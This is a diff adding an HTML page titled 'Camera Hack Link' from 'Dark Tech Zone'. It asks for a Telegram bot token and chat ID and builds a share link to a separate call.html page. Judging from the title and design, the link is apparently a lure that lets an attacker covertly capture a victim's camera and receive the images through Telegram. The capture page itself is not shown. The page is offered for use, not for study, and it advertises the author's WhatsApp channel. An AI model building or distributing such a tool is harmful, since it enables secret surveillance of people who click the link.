@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Camera Hack Link</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+<style>
+:root{
+  --bg:#060b10;
+  --card:#0f1722;
+  --accent:#00ffd5;
+  --text:#e8e8e8;
+}
+
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background:radial-gradient(circle at top,#0b1a24,#020508);
+  font-family:Arial,Helvetica,sans-serif;
+  color:var(--text);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+
+/* Red side bar (kept, upgraded) */
+.red-bar{
+  position:fixed;
+  left:0;
+  top:0;
+  width:6px;
+  height:100vh;
+  background:linear-gradient(180deg,#ff004c,#ff6a00);
+  box-shadow:0 0 20px rgba(255,0,76,.8);
+}
+
+/* Main card */
+.container{
+  width:100%;
+  max-width:440px;
+  background:linear-gradient(180deg,#101b27,#0a121b);
+  border-radius:18px;
+  padding:28px 24px;
+  box-shadow:0 0 35px rgba(0,255,213,.25);
+  text-align:center;
+}
+
+/* Title */
+h2{
+  margin:0 0 6px;
+  color:var(--accent);
+  letter-spacing:.5px;
+}
+
+.subtitle{
+  font-size:.9em;
+  opacity:.8;
+  margin-bottom:22px;
+}
+
+/* Inputs */
+input,button{
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border-radius:8px;
+  border:none;
+  font-size:1em;
+}
+
+input{
+  background:#060b12;
+  color:#fff;
+  border:1px solid rgba(0,255,213,.25);
+}
+
+input::placeholder{
+  color:#aaa;
+}
+
+/* Buttons */
+button{
+  background:linear-gradient(135deg,#00ffd5,#00bfa5);
+  color:#000;
+  font-weight:bold;
+  cursor:pointer;
+  transition:.25s;
+}
+
+button:hover{
+  transform:translateY(-2px);
+  box-shadow:0 0 15px rgba(0,255,213,.8);
+}
+
+/* Link box */
+#linkBox{
+  display:none;
+  margin-top:15px;
+  background:#050a10;
+  padding:14px;
+  border-radius:10px;
+  border:1px solid rgba(0,255,213,.3);
+}
+
+#generatedLink{
+  background:#000;
+  color:#00ff88;
+  font-size:.85em;
+}
+
+/* Copy button */
+.copy-btn{
+  margin-top:8px;
+}
+
+/* WhatsApp button (original link kept) */
+.footer-btn{
+  background:#25d366;
+  color:#fff;
+  font-weight:bold;
+  border:none;
+  border-radius:8px;
+  padding:12px;
+  width:100%;
+  margin-top:20px;
+}
+
+.footer-btn:hover{
+  box-shadow:0 0 15px rgba(37,211,102,.8);
+}
+
+/* Footer credit */
+.footer-credit{
+  margin-top:12px;
+  font-size:.85em;
+  opacity:.85;
+  color:#cfcfcf;
+}
+</style>
+</head>
+
+<body>
+
+<div class="red-bar"></div>
+
+<div class="container">
+
+  <h2>Enter Telegram Bot Info</h2>
+  <div class="subtitle">Dark Tech Zone Secure Link Generator</div>
+
+  <input type="text" id="botToken" placeholder="Telegram Bot Token">
+  <input type="text" id="chatId" placeholder="Chat ID">
+
+  <button onclick="generateLink()">
+    <i class="fas fa-link"></i> Generate Share Link
+  </button>
+
+  <div id="linkBox">
+    <strong>Copy & Share:</strong>
+    <input type="text" id="generatedLink" readonly>
+    <button class="copy-btn" onclick="copyLink()">
+      <i class="fas fa-copy"></i> Copy Link
+    </button>
+  </div>
+
+  <a href="https://whatsapp.com/channel/0029VbBXISPDuMRjYCb7Xl0X" target="_blank">
+    <button class="footer-btn">
+      <i class="fab fa-whatsapp"></i> Join My WhatsApp Channel
+    </button>
+  </a>
+
+  <div class="footer-credit">
+    DEVELOPED BY HASSNAIN ALI<br>
+    OWNER OF DARK-TECH-ZONE
+  </div>
+
+</div>
+
+<script>
+function generateLink() {
+  const botToken = encodeURIComponent(
+    document.getElementById('botToken').value.trim()
+  );
+  const chatId = encodeURIComponent(
+    document.getElementById('chatId').value.trim()
+  );
+
+  if (!botToken || !chatId) {
+    alert('Both fields are required!');
+    return;
+  }
+
+  const link = `${location.origin}/call.html?token=${botToken}&chat=${chatId}`;
+  document.getElementById('generatedLink').value = link;
+  document.getElementById('linkBox').style.display = 'block';
+}
+
+function copyLink() {
+  const linkInput = document.getElementById('generatedLink');
+  linkInput.select();
+  linkInput.setSelectionRange(0, 99999);
+  document.execCommand('copy');
+  alert('Link copied!');
+}
+</script>
+
+</body>
+</html>
